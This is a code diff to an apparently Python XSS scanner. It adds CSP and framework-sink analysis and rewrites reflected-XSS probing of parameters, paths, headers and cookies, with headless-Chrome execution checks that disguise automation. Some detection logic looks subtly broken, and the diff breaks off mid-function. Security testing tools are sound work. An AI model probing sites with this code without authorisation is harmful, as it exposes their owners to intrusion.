@@ -37,7 +37,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 import base64
 import zlib
 import pickle
-from urllib.parse import urlparse, urljoin, parse_qs, quote, unquote, urlunparse
+from urllib.parse import urlparse, urljoin, parse_qs, quote, unquote, urlunparse,urlencode
 import sys
 import subprocess
 import warnings
@@ -1068,738 +1068,581 @@ class XSSDetectionEngine:
         return vulnerabilities
 
 
+
+class CSPAnalyzer:
+    def __init__(self, headers: Dict[str, str]):
+        self.raw = headers.get("Content-Security-Policy", "")
+        self.directives = self._parse()
+
+    def _parse(self) -> Dict[str, List[str]]:
+        result = {}
+
+        for d in self.raw.split(";"):
+            parts = d.strip().split()
+            if len(parts) > 1:
+                result[parts[0]] = parts[1:]
+        return result
+
+    def has_csp(self) -> bool:
+        return bool(self.raw.strip())
+
+    def has_directive(self, name: str) -> bool:
+        return name in self.directives
+
+    def blocks_inline(self) -> bool:
+        return "'unsafe-inline'" not in self.directives.get("script-src", [])
+
+    def allows_eval(self) -> bool:
+        return "'unsafe-eval'" in self.directives.get("script-src", [])
+
+    def allows_js_uri(self) -> bool:
+        return "'unsafe-inline'" in self.directives.get("script-src", [])
+
+    def nonce_reuse_possible(self) -> bool:
+        nonces = [x for x in self.directives.get("script-src", []) if x.startswith("'nonce-")]
+        return len(set(nonces)) < len(nonces)
+
+    def unsafe_hashes(self) -> bool:
+        return "'unsafe-hashes'" in self.directives.get("script-src", [])
+
+    def summary(self) -> Dict[str, Any]:
+        return {
+            "present": self.has_csp(),
+            "blocks_inline": self.blocks_inline(),
+            "allows_eval": self.allows_eval(),
+            "allows_js_uri": self.allows_js_uri(),
+            "nonce_reuse_possible": self.nonce_reuse_possible(),
+            "unsafe_hashes": self.unsafe_hashes()
+        }
+
+class FrameworkSinkDetector:
+    REACT = ["dangerouslySetInnerHTML"]
+    VUE = ["v-html"]
+    ANGULAR = ["[innerHTML]", "$sce.trustAsHtml"]
+
+    def detect(self, html: str) -> Dict[str, List[str]]:
+        found = {"react": [], "vue": [], "angular": []}
+
+        for k in self.REACT:
+            if k in html:
+                found["react"].append(k)
+
+        for k in self.VUE:
+            if k in html:
+                found["vue"].append(k)
+
+        for k in self.ANGULAR:
+            if k in html:
+                found["angular"].append(k)
+
+        return found
+
+
+class TrustedTypesDetector:
+    def detect(self, headers: Dict[str, str]) -> bool:
+        csp = headers.get("Content-Security-Policy", "")
+        return "trusted-types" in csp or "require-trusted-types-for 'script'" in csp
+
+
+class DOMTaintGraph:
+    def __init__(self):
+        self.flows = []
+
+    def add(self, source: str, sink: str):
+        self.flows.append({"source": source, "sink": sink})
+
+    def risky(self) -> bool:
+        return bool(self.flows)
+
+    def summary(self):
+        return self.flows
+
+
+class ExploitabilityEngine:
+    def assess(self, vuln, csp: CSPAnalyzer, browser_exec: bool) -> Dict[str, Any]:
+        if vuln.type == "blind":
+            return {"exploitable": False, "reason": "No OOB callback"}
+
+        if csp.has_csp() and csp.blocks_inline():
+            return {"exploitable": False, "reason": "Blocked by CSP"}
+
+        if not browser_exec:
+            return {"exploitable": False, "reason": "No browser execution"}
+
+        return {"exploitable": True}
+
+
+class CVSSCalculator:
+    def score(self, exploitable: bool, stored=False, dom=False,reflected = False) -> float:
+        if not exploitable:
+            return 0.0
+        if stored:
+            return 8.8
+        if dom or reflected:
+            return 6.1
+        return 5.4
+
+
+
+
+
+
+
+
+
+
 class ReflectedXSSDetector:
-    """Detect reflected XSS vulnerabilities"""
+    """
+    Detect reflected XSS vulnerabilities with CSP, browser execution,
+    and exploitability-aware scoring.
+    """
 
     def __init__(self, config: ScannerConfig = None):
         self.config = config or ScannerConfig()
 
+    # ============================================================
+    # Entry point
+    # ============================================================
     def test(self, url: str, http_client: AdvancedHTTPClient,
              payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
-        """Test URL for reflected XSS"""
+
         vulnerabilities = []
 
-        # Parse URL to get parameters
         parsed = urlparse(url)
         params = parse_qs(parsed.query)
 
-        # Test each parameter
-        for param_name in params.keys():
-            param_vulns = self.test_parameter(
-                url, param_name, http_client, payload_generator
+        # ---- Query parameters ----
+        for param in params.keys():
+            vulnerabilities.extend(
+                self._test_parameter(url, param, http_client, payload_generator)
             )
-            vulnerabilities.extend(param_vulns)
 
-        # Test URL path
-        path_vulns = self.test_path(url, http_client, payload_generator)
-        vulnerabilities.extend(path_vulns)
+        # ---- Path ----
+        vulnerabilities.extend(
+            self._test_path(url, http_client, payload_generator)
+        )
 
-        # Test headers
+        # ---- Headers ----
         if self.config.fuzz_headers:
-            header_vulns = self.test_headers(url, http_client, payload_generator)
-            vulnerabilities.extend(header_vulns)
+            vulnerabilities.extend(
+                self._test_headers(url, http_client, payload_generator)
+            )
 
-        # Test cookies
+        # ---- Cookies ----
         if self.config.fuzz_cookies:
-            cookie_vulns = self.test_cookies(url, http_client, payload_generator)
-            vulnerabilities.extend(cookie_vulns)
+            vulnerabilities.extend(
+                self._test_cookies(url, http_client, payload_generator)
+            )
 
         return vulnerabilities
 
-    def test_parameter(self, url: str, param_name: str,
-                       http_client: AdvancedHTTPClient,
-                       payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
-        """Test a specific parameter for XSS - FIXED VERSION"""
-        vulnerabilities = []
+    # ============================================================
+    # Core reflected parameter testing
+    # ============================================================
+    def _test_parameter(self, url, param, http_client, payload_generator):
+        vulns = []
         payloads = payload_generator.get_reflected_payloads()
+
+        if not self._target_alive(url, http_client):
+            return vulns
 
         for payload in payloads[:self.config.payload_count]:
             try:
-                # Parse URL
+                if payload.lower().startswith(("javascript:", "data:")):
+                    continue
+
                 parsed = urlparse(url)
-
-                # Skip JavaScript/DATA payloads for GET parameters - they need special handling
-                if payload.lower().startswith(('javascript:', 'data:')):
-                    # These are for DOM XSS testing, not reflected GET
-                    continue
-
-                # Skip payloads with hash fragments for reflected testing
-                if '#' in payload:
-                    continue
-
-                # Prepare test URL with payload
                 params = parse_qs(parsed.query, keep_blank_values=True)
 
-                # Clean the payload for URL inclusion
-                # Remove problematic characters that break URL parsing
-                clean_payload = payload
-
-                # Remove control characters and problematic sequences
-                clean_payload = re.sub(r'[\n\r\t]', '', clean_payload)
-
-                # Don't encode the entire payload if it's HTML, just URL-encode it
-                clean_payload = quote(clean_payload, safe='')
-
-                # Set the parameter with clean payload
-                params[param_name] = [clean_payload]
-
-                # Reconstruct URL properly
-                new_query = '&'.join(
-                    f"{k}={v[0]}" if isinstance(v, list) else f"{k}={v}"
-                    for k, v in params.items()
-                )
+                clean = quote(re.sub(r"[\n\r\t]", "", payload), safe="")
+                params[param] = [clean]
 
                 test_url = urlunparse((
                     parsed.scheme,
                     parsed.netloc,
                     parsed.path,
                     parsed.params,
-                    new_query,
-                    ''  # Clear fragment for testing
+                    urlencode(params, doseq=True),
+                    ""
                 ))
 
-                # Validate test URL
-                if not self.is_valid_test_url(test_url):
+                response = http_client.get(test_url)
+
+                # ---- reflection check ----
+                if not self._is_reflected(payload, response.text):
                     continue
 
-                # Make request
-                response = http_client.get(test_url)
+                if not self._reflection_context_dangerous(payload, response.text):
+                    continue
 
-                # Check if payload is reflected AND properly contextualized
-                if self.is_payload_reflected(payload, response.text):
-                    # Verify XSS with better heuristics
-                    if self.verify_xss_reflected(test_url, payload, response.text):
-                        vuln = self.create_vulnerability(
-                            url=test_url,
-                            param=param_name,
-                            payload=payload,
-                            response=response,
-                            vuln_type="reflected"
-                        )
-                        vulnerabilities.append(vuln)
+                # ---- security context ----
+                security = self._extract_security_context(response)
+
+                # ---- browser execution (ONLY if CSP allows) ----
+                browser_exec = False
+                if not (security["csp"].has_csp() and security["csp"].blocks_inline()):
+                    browser_exec = self._browser_reflected_execution(test_url)
+
+                exploitable = browser_exec
+
+                vuln = Vulnerability(
+                    id=hashlib.md5(f"{test_url}:{param}:{payload}".encode()).hexdigest()[:16],
+                    type="reflected",
+                    url=test_url,
+                    method="GET",
+                    parameter=param,
+                    payload=payload,
+                    evidence="Payload reflected in dangerous context",
+                    cwe=["CWE-79"],
+                    severity="high" if exploitable else "informational",
+                    confidence=0.9 if exploitable else 0.3,
+                    context={
+                        "csp": security["csp"].summary(),
+                        "trusted_types": security["trusted_types"],
+                        "framework_sinks": security["frameworks"],
+                        "browser_execution": browser_exec,
+                        "exploitability": exploitable
+                    }
+                )
+
+                vuln.cvss_score = CVSSCalculator().score(
+                    exploitable=exploitable,
+                    reflected=True
+                )
+
+                if not exploitable:
+                    vuln.tags.append("mitigated-by-csp")
+
+                vulns.append(vuln)
 
             except Exception as e:
-                logging.debug(f"Parameter test failed for {param_name}: {e}")
+                logging.debug(f"Reflected param test failed: {e}")
 
-        return vulnerabilities
+        return vulns
 
-    def verify_xss_reflected(self, url: str, payload: str, response_text: str) -> bool:
-        """Better verification for reflected XSS"""
-
-        # ---------------------------------------------------------------------
-        # Prepare encoded variants (ALWAYS defined)
-        # ---------------------------------------------------------------------
-        encoded_versions = [
-            payload,
-            html.escape(payload),
-            payload.replace('<', '&lt;').replace('>', '&gt;'),
-            payload.replace('<', '%3C').replace('>', '%3E'),
-            payload.replace('"', '&quot;').replace("'", '&#x27;'),
-        ]
-
-        # ---------------------------------------------------------------------
-        # Check if any version is reflected
-        # ---------------------------------------------------------------------
-        matched_payload = None
-        idx = -1
-
-        for variant in encoded_versions:
-            idx = response_text.find(variant)
-            if idx != -1:
-                matched_payload = variant
-                break
-
-        if matched_payload is None:
-            return False
-
-        # ---------------------------------------------------------------------
-        # Analyze context (±100 chars)
-        # ---------------------------------------------------------------------
-        start = max(0, idx - 100)
-        end = min(len(response_text), idx + len(matched_payload) + 100)
-        context = response_text[start:end].lower()
-
-        # ---------------------------------------------------------------------
-        # Dangerous reflection patterns (with confidence)
-        # ---------------------------------------------------------------------
-        dangerous_patterns = [
-            # Inside <script> block
-            (r'<script[^>]*>.*' + re.escape(matched_payload) + r'.*</script>', 0.9),
-
-            # Inline event handler
-            (r'on\w+\s*=\s*["\'].*' + re.escape(matched_payload), 0.8),
-
-            # Dangerous URL attributes
-            (r'<[^>]*\b(href|src|action)\s*=\s*["\'].*' + re.escape(matched_payload), 0.7),
-
-            # Raw HTML injection
-            (r'<\w+[^>]*>.*' + re.escape(matched_payload) + r'.*</\w+>', 0.6),
-        ]
-
-        for pattern, confidence in dangerous_patterns:
-            if re.search(pattern, context, re.IGNORECASE | re.DOTALL):
-                return confidence >= 0.6
-
-        # ---------------------------------------------------------------------
-        # Sanitization check (encoded output → safe)
-        # ---------------------------------------------------------------------
-        sanitization_markers = [
-            '&lt;', '&gt;', '&quot;', '&#x27;', '%3c', '%3e'
-        ]
-
-        if '<' in payload and '>' in payload:
-            if any(marker in context for marker in sanitization_markers):
-                return False
-
-        return False
-
-    def test_path(self, url: str, http_client: AdvancedHTTPClient,
-                  payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
-        """Test URL path for XSS (e.g., /path/<payload>)"""
-        vulnerabilities = []
+    # ============================================================
+    # Path / header / cookie tests (same logic)
+    # ============================================================
+    def _test_path(self, url, http_client, payload_generator):
+        vulns = []
         payloads = payload_generator.get_reflected_payloads()
-
         parsed = urlparse(url)
-        base_url = f"{parsed.scheme}://{parsed.netloc}"
+        base = f"{parsed.scheme}://{parsed.netloc}"
 
-        for payload in payloads[:min(10, self.config.payload_count)]:
+        for payload in payloads[:5]:
             try:
-                # Create test URL with payload in path
-                # Remove any existing path and add payload
-                test_path = f"/{payload}"
-                test_url = f"{base_url}{test_path}"
-
+                test_url = f"{base}/{payload}"
                 response = http_client.get(test_url)
 
-                if self.is_payload_reflected(payload, response.text):
-                    if self.verify_xss(test_url, payload, http_client):
-                        vuln = Vulnerability(
-                            id=hashlib.md5(f"path:{test_url}".encode()).hexdigest()[:16],
-                            type="reflected",
-                            url=test_url,
-                            method="GET",
-                            parameter="path",
-                            payload=payload,
-                            evidence="Payload reflected in path",
-                            confidence=0.7,
-                            severity="high" if "<script>" in payload else "medium",
-                            location="response_body"
-                        )
-                        vulnerabilities.append(vuln)
+                if not self._is_reflected(payload, response.text):
+                    continue
 
-            except Exception as e:
-                logging.debug(f"Path test failed: {e}")
+                security = self._extract_security_context(response)
 
-        return vulnerabilities
+                browser_exec = False
+                if not (security["csp"].has_csp() and security["csp"].blocks_inline()):
+                    browser_exec = self._browser_reflected_execution(test_url)
 
-    def test_headers(self, url: str, http_client: AdvancedHTTPClient,
-                     payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
-        """Test HTTP headers for XSS"""
-        vulnerabilities = []
+                vuln = Vulnerability(
+                    id=hashlib.md5(f"path:{test_url}".encode()).hexdigest()[:16],
+                    type="reflected",
+                    url=test_url,
+                    method="GET",
+                    parameter="path",
+                    payload=payload,
+                    evidence="Payload reflected in URL path",
+                    severity="high" if browser_exec else "informational",
+                    confidence=0.9 if browser_exec else 0.3,
+                    cwe=["CWE-79"]
+                )
+
+                vuln.cvss_score = CVSSCalculator().score(
+                    exploitable=browser_exec,
+                    reflected=True
+                )
+
+                if not browser_exec:
+                    vuln.tags.append("mitigated-by-csp")
+
+                vulns.append(vuln)
+
+            except Exception:
+                pass
+
+        return vulns
+
+    def _test_headers(self, url, http_client, payload_generator):
+        vulns = []
         payloads = payload_generator.get_reflected_payloads()
-
-        headers_to_test = [
-            'User-Agent',
-            'Referer',
-            'X-Forwarded-For',
-            'X-Real-IP',
-            'Origin',
-            'X-Requested-With'
-        ]
+        headers_to_test = ["User-Agent", "Referer", "X-Forwarded-For"]
 
         for header in headers_to_test:
-            for payload in payloads[:min(5, self.config.payload_count)]:
+            for payload in payloads[:3]:
                 try:
-                    custom_headers = {header: payload}
-                    response = http_client.get(url, headers=custom_headers)
+                    response = http_client.get(url, headers={header: payload})
 
-                    if self.is_payload_reflected(payload, response.text):
-                        if self.verify_xss(url, payload, http_client):
-                            vuln = Vulnerability(
-                                id=hashlib.md5(f"header:{url}:{header}".encode()).hexdigest()[:16],
-                                type="reflected",
-                                url=url,
-                                method="GET",
-                                parameter=f"header:{header}",
-                                payload=payload,
-                                evidence=f"Payload reflected via {header} header",
-                                confidence=0.6,
-                                severity="medium",
-                                location="response_body"
-                            )
-                            vulnerabilities.append(vuln)
+                    if not self._is_reflected(payload, response.text):
+                        continue
 
-                except Exception as e:
-                    logging.debug(f"Header test failed for {header}: {e}")
+                    security = self._extract_security_context(response)
+                    browser_exec = False
 
-        return vulnerabilities
+                    if not (security["csp"].has_csp() and security["csp"].blocks_inline()):
+                        browser_exec = self._browser_reflected_execution(url)
 
-    def test_cookies(self, url: str, http_client: AdvancedHTTPClient,
-                     payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
-        """Test cookies for XSS"""
-        vulnerabilities = []
+                    vuln = Vulnerability(
+                        id=hashlib.md5(f"{url}:{header}:{payload}".encode()).hexdigest()[:16],
+                        type="reflected",
+                        url=url,
+                        method="GET",
+                        parameter=f"header:{header}",
+                        payload=payload,
+                        evidence=f"Payload reflected via {header}",
+                        severity="high" if browser_exec else "informational",
+                        confidence=0.9 if browser_exec else 0.3,
+                        cwe=["CWE-79"]
+                    )
+
+                    vuln.cvss_score = CVSSCalculator().score(
+                        exploitable=browser_exec,
+                        reflected=True
+                    )
+
+                    if not browser_exec:
+                        vuln.tags.append("mitigated-by-csp")
+
+                    vulns.append(vuln)
+
+                except Exception:
+                    pass
+
+        return vulns
+
+    def _test_cookies(self, url, http_client, payload_generator):
+        vulns = []
         payloads = payload_generator.get_reflected_payloads()
 
-        cookie_names = ['test_cookie', 'session', 'auth', 'token']
+        for payload in payloads[:3]:
+            try:
+                http_client.session.cookies.set("XSS_TEST", payload)
+                response = http_client.get(url)
 
-        for cookie_name in cookie_names:
-            for payload in payloads[:min(5, self.config.payload_count)]:
-                try:
-                    # Set cookie
-                    http_client.session.cookies.set(cookie_name, payload)
-                    response = http_client.get(url)
+                if not self._is_reflected(payload, response.text):
+                    continue
 
-                    if self.is_payload_reflected(payload, response.text):
-                        if self.verify_xss(url, payload, http_client):
-                            vuln = Vulnerability(
-                                id=hashlib.md5(f"cookie:{url}:{cookie_name}".encode()).hexdigest()[:16],
-                                type="reflected",
-                                url=url,
-                                method="GET",
-                                parameter=f"cookie:{cookie_name}",
-                                payload=payload,
-                                evidence=f"Payload reflected via {cookie_name} cookie",
-                                confidence=0.6,
-                                severity="medium",
-                                location="response_body"
-                            )
-                            vulnerabilities.append(vuln)
+                security = self._extract_security_context(response)
+                browser_exec = False
 
-                except Exception as e:
-                    logging.debug(f"Cookie test failed for {cookie_name}: {e}")
+                if not (security["csp"].has_csp() and security["csp"].blocks_inline()):
+                    browser_exec = self._browser_reflected_execution(url)
 
-        return vulnerabilities
+                vuln = Vulnerability(
+                    id=hashlib.md5(f"cookie:{url}:{payload}".encode()).hexdigest()[:16],
+                    type="reflected",
+                    url=url,
+                    method="GET",
+                    parameter="cookie:XSS_TEST",
+                    payload=payload,
+                    evidence="Payload reflected via cookie",
+                    severity="high" if browser_exec else "informational",
+                    confidence=0.9 if browser_exec else 0.3,
+                    cwe=["CWE-79"]
+                )
 
-    def test_json(self, url: str, http_client: AdvancedHTTPClient,
-                  payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
-        """Test JSON parameters for XSS"""
-        vulnerabilities = []
-        payloads = payload_generator.get_reflected_payloads()
+                vuln.cvss_score = CVSSCalculator().score(
+                    exploitable=browser_exec,
+                    reflected=True
+                )
 
-        # Test common JSON endpoints
-        json_endpoints = [
-            f"{url}/api/search",
-            f"{url}/api/query",
-            f"{url}/api/filter",
-            f"{url}/search",
-            f"{url}/query"
-        ]
+                if not browser_exec:
+                    vuln.tags.append("mitigated-by-csp")
 
-        for endpoint in json_endpoints:
-            for payload in payloads[:min(10, self.config.payload_count)]:
-                try:
-                    json_data = {
-                        "q": payload,
-                        "search": payload,
-                        "query": payload,
-                        "filter": payload,
-                        "input": payload
-                    }
+                vulns.append(vuln)
 
-                    response = http_client.post(endpoint, json=json_data)
+            except Exception:
+                pass
 
-                    if self.is_payload_reflected(payload, response.text):
-                        if self.verify_xss(endpoint, payload, http_client):
-                            vuln = Vulnerability(
-                                id=hashlib.md5(f"json:{endpoint}".encode()).hexdigest()[:16],
-                                type="reflected",
-                                url=endpoint,
-                                method="POST",
-                                parameter="JSON body",
-                                payload=payload,
-                                evidence="Payload reflected in JSON response",
-                                confidence=0.7,
-                                severity="high" if "<script>" in payload else "medium",
-                                location="response_body"
-                            )
-                            vulnerabilities.append(vuln)
+        return vulns
 
-                except Exception as e:
-                    logging.debug(f"JSON test failed for {endpoint}: {e}")
+    # ============================================================
+    # Helpers
+    # ============================================================
+    def _target_alive(self, url, client):
+        try:
+            r = client.get(url)
+            return r.status_code < 500
+        except Exception:
+            return False
 
-        return vulnerabilities
-
-    def test_form_data(self, url: str, http_client: AdvancedHTTPClient,
-                       payload_generator: 'XSSPayloadGenerator') -> List[Vulnerability]:
-        """Test form data (POST parameters) for XSS"""
-        vulnerabilities = []
-        payloads = payload_generator.get_reflected_payloads()
-
-        # Common form field names
-        form_fields = ['username', 'email', 'comment', 'message', 'content',
-                       'title', 'description', 'name', 'search', 'query']
-
-        for field in form_fields:
-            for payload in payloads[:min(10, self.config.payload_count)]:
-                try:
-                    form_data = {field: payload}
-                    response = http_client.post(url, data=form_data)
-
-                    if self.is_payload_reflected(payload, response.text):
-                        if self.verify_xss(url, payload, http_client):
-                            vuln = Vulnerability(
-                                id=hashlib.md5(f"form:{url}:{field}".encode()).hexdigest()[:16],
-                                type="reflected",
-                                url=url,
-                                method="POST",
-                                parameter=field,
-                                payload=payload,
-                                evidence=f"Payload reflected via form field '{field}'",
-                                confidence=0.8,
-                                severity="high" if "<script>" in payload else "medium",
-                                location="response_body"
-                            )
-                            vulnerabilities.append(vuln)
-
-                except Exception as e:
-                    logging.debug(f"Form test failed for {field}: {e}")
-
-        return vulnerabilities
-
-    def is_payload_reflected(self, payload: str, response_text: str) -> bool:
-        """Check if payload is reflected in response"""
-        # Check for exact reflection
-        if payload in response_text:
-            return True
-
-        # Check for encoded reflection
-        encoded_payloads = [
+    def _is_reflected(self, payload, body):
+        variants = [
+            payload,
             html.escape(payload),
-            payload.replace('<', '&lt;').replace('>', '&gt;'),
             quote(payload),
-            base64.b64encode(payload.encode()).decode(),
-            payload.replace('"', '&quot;').replace("'", '&#x27;'),
-            payload.replace('<', '%3C').replace('>', '%3E'),
-            payload.replace('<', '\\u003C').replace('>', '\\u003E'),
+            payload.replace("<", "&lt;").replace(">", "&gt;")
         ]
+        return any(v in body for v in variants)
 
-        for encoded in encoded_payloads:
-            if encoded in response_text:
-                return True
+    def _reflection_context_dangerous(self, payload, body):
+        escaped = html.escape(payload)
+        if escaped in body:
+            return False  # safely encoded
 
-        # Check for partial reflection (common in frameworks)
-        if len(payload) > 10:
-            # Check first and last parts
-            first_part = payload[:min(10, len(payload) // 2)]
-            last_part = payload[-min(10, len(payload) // 2):]
+        patterns = [
+            r"<script[^>]*>.*" + re.escape(payload),
+            r"on\w+\s*=\s*['\"].*" + re.escape(payload),
+            r"(href|src|action)\s*=\s*['\"].*" + re.escape(payload)
+        ]
+        return any(re.search(p, body, re.I | re.S) for p in patterns)
 
-            if first_part in response_text and last_part in response_text:
-                return True
-
-        return False
-
-    def verify_xss(self, url: str, payload: str, http_client) -> bool:
+    def _browser_reflected_execution(self, url: str) -> bool:
         """
-        Verify XSS by attempting JS execution, heuristics,
-        and reflection-context analysis.
+        Selenium-based reflected XSS execution verification.
+        Returns True ONLY if JavaScript actually executed in the browser.
         """
 
-        safe_payload = self.make_payload_safe(payload)
+        driver = None
+        try:
+            # --------------------------------------------------
+            # Acquire driver from your browser manager
+            # --------------------------------------------------
+            driver = self.get_headless_browser()  # <-- adapt if needed
 
-        # =========================================================================
-        # METHOD 1: JavaScript Engine Execution (BEST-EFFORT)
-        # =========================================================================
+            # --------------------------------------------------
+            # 1️⃣ Install execution monitor BEFORE navigation
+            # --------------------------------------------------
+            driver.execute_script("""
+                window.__xssExecuted = false;
 
-        # ---- MiniRacer (PRIMARY) ----
-        if MINIRACER_AVAILABLE:
-            try:
-                from py_mini_racer import MiniRacer
-
-                ctx = MiniRacer()
-
-                # Minimal browser-like environment
-                ctx.eval("""
-                    var window = {};
-                    window.alert = function(){ return true; };
-                    window.confirm = function(){ return true; };
-                    window.prompt = function(){ return true; };
-
-                    var document = {};
-                    document.write = function(str){
-                        return str && (
-                            str.indexOf("script") !== -1 ||
-                            str.indexOf("alert") !== -1
-                        );
+                // Hook alert / confirm / prompt
+                ['alert','confirm','prompt'].forEach(fn => {
+                    const original = window[fn];
+                    window[fn] = function() {
+                        window.__xssExecuted = true;
+                        return original ? original.apply(this, arguments) : undefined;
                     };
-                    document.body = { innerHTML: "" };
+                });
 
-                    var location = { href: "" };
-                """)
+                // Hook eval / Function
+                const originalEval = window.eval;
+                window.eval = function() {
+                    window.__xssExecuted = true;
+                    return originalEval.apply(this, arguments);
+                };
 
-                try:
-                    result = ctx.eval(safe_payload)
-                    if bool(result):
-                        return True
-                except Exception:
-                    pass
+                const OriginalFunction = window.Function;
+                window.Function = function() {
+                    window.__xssExecuted = true;
+                    return OriginalFunction.apply(this, arguments);
+                };
 
-            except Exception as e:
-                logging.debug(f"MiniRacer verification failed: {e}")
+                // Mutation-based execution (e.g. <img onerror>)
+                document.addEventListener("error", function(e) {
+                    window.__xssExecuted = true;
+                }, true);
+            """)
 
-        # ---- DukPy (FALLBACK) ----
-        if DUKPY_AVAILABLE:
+            # --------------------------------------------------
+            # 2️⃣ Navigate to target URL
+            # --------------------------------------------------
+            driver.get(url)
+
+            # --------------------------------------------------
+            # 3️⃣ Allow time for async execution
+            # --------------------------------------------------
+            time.sleep(1.5)
+
+            # --------------------------------------------------
+            # 4️⃣ Read execution flag
+            # --------------------------------------------------
+            executed = driver.execute_script("""
+                return window.__xssExecuted === true;
+            """)
+
+            return bool(executed)
+
+        except Exception as e:
+            logging.debug(f"Browser reflected execution check failed: {e}")
+            return False
+
+        finally:
             try:
-                import dukpy
+                if driver:
+                    driver.quit()
+            except Exception:
+                pass
 
-                js_env = """
-                    var window = {};
-                    window.alert = function(){ return true; };
-                    window.confirm = function(){ return true; };
-                    window.prompt = function(){ return true; };
 
-                    var document = {};
-                    document.write = function(str){
-                        return str && (
-                            str.indexOf("script") !== -1 ||
-                            str.indexOf("alert") !== -1
-                        );
-                    };
-                    document.body = { innerHTML: "" };
+    def get_headless_browser(self):
+        """Get headless browser instance - IMPROVED"""
+        options = ChromeOptions()
+        options.add_argument('--headless=new')  # New headless mode
+        options.add_argument('--no-sandbox')
+        options.add_argument('--disable-dev-shm-usage')
+        options.add_argument('--disable-gpu')
+        options.add_argument('--window-size=1920,1080')
+        options.add_argument('--disable-blink-features=AutomationControlled')
 
-                    var location = { href: "" };
-                """
+        # Performance optimizations
+        options.add_argument('--disable-extensions')
+        options.add_argument('--disable-notifications')
+        options.add_argument('--disable-popup-blocking')
+        options.add_argument('--disable-default-apps')
+        options.add_argument('--disable-infobars')
 
-                try:
-                    result = dukpy.evaljs(js_env + safe_payload)
-                    if bool(result):
-                        return True
-                except Exception:
-                    pass
+        # Disable images for faster loading
+        prefs = {
+            "profile.managed_default_content_settings.images": 2,
+            "profile.default_content_setting_values.notifications": 2,
+            "profile.default_content_setting_values.popups": 2
+        }
+        options.add_experimental_option("prefs", prefs)
 
-            except Exception as e:
-                logging.debug(f"DukPy verification failed: {e}")
+        # Add experimental options to avoid detection
+        options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
+        options.add_experimental_option('useAutomationExtension', False)
 
-        # =========================================================================
-        # METHOD 2: PAYLOAD HEURISTICS (FAST & EFFECTIVE)
-        # =========================================================================
-
-        payload_l = payload.lower()
-
-        execution_patterns = [
-            ("<script", "</script>"),
-            ("<img", "onerror"),
-            ("<svg", "onload"),
-            ("<body", "onload"),
-            ("javascript:", "alert"),
-            ("javascript:", "confirm"),
-            ("javascript:", "prompt"),
-            ("data:text/html", "<script"),
-            ("<iframe", "srcdoc"),
-        ]
-
-        for start, trigger in execution_patterns:
-            if start in payload_l and trigger in payload_l:
-                return True
-
-        # =========================================================================
-        # METHOD 3: REFLECTION CONTEXT ANALYSIS
-        # =========================================================================
+        # Add performance arguments
+        options.add_argument('--disable-software-rasterizer')
+        options.add_argument('--disable-web-security')
+        options.add_argument('--disable-features=VizDisplayCompositor')
 
         try:
-            response = http_client.get(url)
-            body = response.text
-        except Exception:
-            return False
+            driver = webdriver.Chrome(options=options)
 
-        if payload not in body:
-            return False
+            # Set timeouts
+            driver.set_page_load_timeout(30)
+            driver.set_script_timeout(30)
 
-        idx = body.find(payload)
-        if idx < 0:
-            return False
+            # Execute CDP commands to avoid detection
+            driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
+                'source': '''
+                    Object.defineProperty(navigator, 'webdriver', {
+                        get: () => undefined
+                    });
+                    Object.defineProperty(navigator, 'plugins', {
+                        get: () => [1, 2, 3, 4, 5]
+                    });
+                    Object.defineProperty(navigator, 'languages', {
+                        get: () => ['en-US', 'en']
+                    });
+                '''
+            })
 
-        before = body[max(0, idx - 100):idx].lower()
-        after = body[idx + len(payload):idx + len(payload) + 100].lower()
+            return driver
 
-        # Script context
-        if "<script" in before and "</script>" in after:
-            return True
+        except Exception as e:
+            logging.error(f"Failed to create Chrome driver: {e}")
+            raise
 
-        # HTML attribute context
-        if before.rstrip().endswith(("='", '="')):
-            if after.startswith(("'", '"')):
-                return True
-
-        # Inline handler context
-        if "onerror=" in before or "onload=" in before:
-            return True
-
-        return False
-
-    def make_payload_safe(self, payload: str) -> str:
-        """Make payload safe for JavaScript evaluation"""
-        safe = payload
-
-        # Remove script tags but keep content
-        safe = safe.replace('<script>', '').replace('</script>', '')
-
-        # Remove dangerous functions in safe mode
-        dangerous = ['document.write', 'eval', 'Function', 'setTimeout', 'setInterval']
-        for func in dangerous:
-            safe = safe.replace(func, f"safe_{func}")
-
-        # Escape quotes
-        safe = safe.replace('"', '\\"').replace("'", "\\'")
-
-        return safe
-
-    def create_vulnerability(self, url: str, param: str, payload: str,
-                             response: requests.Response, vuln_type: str) -> Vulnerability:
-        """Create vulnerability object"""
-        vuln_id = hashlib.md5(f"{url}:{param}:{payload}".encode()).hexdigest()[:16]
-
-        # Determine severity
-        if any(tag in payload for tag in ['<script>', 'javascript:', 'onload=', 'onerror=']):
-            severity = "high"
-        elif any(tag in payload for tag in ['<img', '<svg', '<body']):
-            severity = "medium"
-        else:
-            severity = "low"
-
-        # Check reflection context for better confidence
-        reflection_context = self.get_reflection_context(payload, response.text)
-        confidence = 0.8
-
-        if reflection_context == "script":
-            confidence = 0.9
-            severity = "critical"
-        elif reflection_context == "attribute":
-            confidence = 0.85
-        elif reflection_context == "html":
-            confidence = 0.8
-
-        return Vulnerability(
-            id=vuln_id,
-            type=vuln_type,
-            url=url,
-            method="GET",
-            parameter=param,
-            payload=payload,
-            evidence=f"Payload reflected in {reflection_context} context",
-            http_request=f"GET {url}",
-            http_response=f"Status: {response.status_code}, Length: {len(response.text)}",
-            confidence=confidence,
-            severity=severity,
-            location="response_body",
-            context={"reflection_context": reflection_context}
-        )
-
-    def get_reflection_context(self, payload: str, response_text: str) -> str:
-        """Determine where payload is reflected in the response"""
-        if payload not in response_text:
-            return "unknown"
-
-        idx = response_text.find(payload)
-        before = response_text[max(0, idx - 100):idx]
-        after = response_text[idx + len(payload):idx + len(payload) + 100]
-
-        # Check script context
-        script_start = before.rfind('<script')
-        if script_start != -1 and '</script>' not in before[script_start:]:
-            # Check if we're inside script tag
-            if '</script>' not in before[script_start:] or '</script>' in after:
-                return "script"
-
-        # Check HTML attribute context
